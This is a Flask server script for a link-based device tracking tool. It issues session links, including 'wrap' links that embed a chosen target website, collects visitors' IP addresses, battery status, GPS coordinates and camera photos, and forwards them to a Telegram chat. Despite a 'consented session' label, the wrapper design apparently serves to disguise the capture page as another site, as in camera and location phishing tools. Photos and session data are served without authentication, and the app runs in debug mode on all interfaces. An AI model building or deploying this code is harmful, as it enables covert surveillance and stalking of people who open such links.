# server.py - corrected order: Flask app, helpers, then routes (with wrapper)
import os
import uuid
import base64
import json
import requests
from datetime import datetime
from dotenv import load_dotenv
from flask import Flask, request, send_from_directory, render_template, jsonify, url_for
from urllib.parse import urlparse

# load .env (optional)
load_dotenv()

# ---------- Configuration ----------
UPLOAD_DIR = "uploads"
SESSIONS_FILE = "sessions.json"
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")  # optional, required for Telegram notifications

os.makedirs(UPLOAD_DIR, exist_ok=True)

# ---------- Flask app ----------
app = Flask(__name__, template_folder="templates", static_folder="static")

# ---------- Persistence helpers ----------
def load_sessions():
    try:
        with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_sessions(sessions):
    try:
        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(sessions, f)
    except Exception as e:
        print("Failed to save sessions:", e)

SESSIONS = load_sessions()

# ---------- Telegram helpers ----------
def telegram_api(method: str, data=None, files=None, timeout=30):
    if not TELEGRAM_BOT_TOKEN:
        return None, "no_token"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
    try:
        r = requests.post(url, data=data or {}, files=files or {}, timeout=timeout)
        return r, None
    except Exception as e:
        return None, str(e)

def telegram_send_message(chat_id: str, text: str):
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        return False
    data = {"chat_id": str(chat_id), "text": text}
    r, err = telegram_api("sendMessage", data=data)
    return bool(r and r.ok)

def telegram_send_photo(chat_id: str, photo_path: str, caption: str = None):
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        return False
    try:
        with open(photo_path, "rb") as f:
            files = {"photo": f}
            data = {"chat_id": str(chat_id)}
            if caption:
                data["caption"] = caption
            r, err = telegram_api("sendPhoto", data=data, files=files)
            return bool(r and r.ok)
    except Exception:
        return False

# ---------- URL validation ----------
def is_valid_http_url(u: str):
    try:
        p = urlparse(u)
        return p.scheme in ("http", "https") and bool(p.netloc)
    except Exception:
        return False

# ---------- Endpoints ----------

@app.route("/")
def index():
    return ("Flask server for consented device session. Use the Telegram bot to create sessions.", 200)

# Standard session creation
@app.route("/create", methods=["POST"])
def create_session():
    """
    JSON body: {"label": "...", "chat_id": "<telegram chat id (optional)>"}
    Returns: {"token": "...", "link": "..."}
    """
    data = request.get_json(silent=True) or {}
    label = data.get("label", "")
    chat_id = data.get("chat_id")
    token = uuid.uuid4().hex
    SESSIONS[token] = {
        "label": label,
        "created_at": datetime.utcnow().isoformat(),
        "visits": [],
        "chat_id": chat_id
    }
    save_sessions(SESSIONS)
    link = url_for("session_page", token=token, _external=True)
    if chat_id:
        telegram_send_message(chat_id, f"Session created.\nToken: {token}\nOpen: {link}\nKeep permissions allowed while page is open.")
    return jsonify({"token": token, "link": link})

@app.route("/s/<token>")
def session_page(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    return render_template("session.html", token=token)

# Wrapper creation (embed a target URL)
@app.route("/wrap_create", methods=["POST"])
def wrap_create():
    """
    Body JSON: {"target_url":"https://example.com", "label":"...", "chat_id":"..."}
    Returns: {"token": "...", "link": "..."} where link is /w/<token>
    """
    data = request.get_json(silent=True) or {}
    target_url = data.get("target_url", "").strip()
    if not is_valid_http_url(target_url):
        return jsonify({"error": "invalid_url"}), 400

    label = data.get("label", "")
    chat_id = data.get("chat_id")
    token = uuid.uuid4().hex
    SESSIONS[token] = {
        "label": label,
        "created_at": datetime.utcnow().isoformat(),
        "visits": [],
        "chat_id": chat_id,
        "target_url": target_url,
        "wrap": True
    }
    save_sessions(SESSIONS)
    link = url_for("wrapper_page", token=token, _external=True)
    if chat_id:
        telegram_send_message(chat_id, f"Wrap session created for {target_url}\nOpen: {link}")
    return jsonify({"token": token, "link": link})

@app.route("/w/<token>")
def wrapper_page(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    target = SESSIONS[token].get("target_url", "")
    return render_template("wrapper.html", token=token, target_url=target)

# Upload endpoints
@app.route("/upload_info/<token>", methods=["POST"])
def upload_info(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    payload = request.get_json(silent=True) or {}
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": ip,
        "battery": payload.get("battery"),
        "coords": payload.get("coords")
    }
    SESSIONS[token]["visits"].append(entry)
    save_sessions(SESSIONS)

    chat_id = SESSIONS[token].get("chat_id")
    if chat_id:
        bat = entry.get("battery")
        coords = entry.get("coords")
        summary = f"Session {token} — info at {entry['timestamp']}\nIP: {ip}\nBattery: {bat}\nCoords: {coords}"
        telegram_send_message(chat_id, summary)
    return jsonify({"status": "ok", "stored": entry})

@app.route("/upload_image/<token>", methods=["POST"])
def upload_image(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    data = request.get_json(silent=True) or {}
    b64 = data.get("image_b64", "")
    if not b64:
        return ("No image data", 400)
    if b64.startswith("data:"):
        try:
            b64 = b64.split(",", 1)[1]
        except Exception:
            return ("Bad data url", 400)
    try:
        imgbytes = base64.b64decode(b64)
    except Exception:
        return ("Bad base64", 400)

    # limit image size (reject if > 5 MB)
    if len(imgbytes) > 5_000_000:
        return ("Image too large", 413)

    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
    fname = f"{token}_{timestamp}.jpg"
    path = os.path.join(UPLOAD_DIR, fname)
    with open(path, "wb") as f:
        f.write(imgbytes)

    SESSIONS[token].setdefault("files", []).append(fname)
    save_sessions(SESSIONS)

    chat_id = SESSIONS[token].get("chat_id")
    if chat_id:
        caption = f"Session {token} — photo {timestamp}"
        sent = telegram_send_photo(chat_id, path, caption=caption)
        if not sent:
            try:
                downloads_url = url_for("serve_upload", filename=fname, _external=True)
                telegram_send_message(chat_id, f"Image saved: {downloads_url}")
            except Exception:
                pass

    return jsonify({"status": "saved", "filename": fname})

@app.route("/session_data/<token>")
def session_data(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    return jsonify(SESSIONS[token])

@app.route("/uploads/<filename>")
def serve_upload(filename):
    # Consider protecting this endpoint in production
    return send_from_directory(UPLOAD_DIR, filename)

# ---------- Run ----------
if __name__ == "__main__":
    # Development server. Use a WSGI server & HTTPS in production.
    app.run(host="0.0.0.0", port=5000, debug=True)
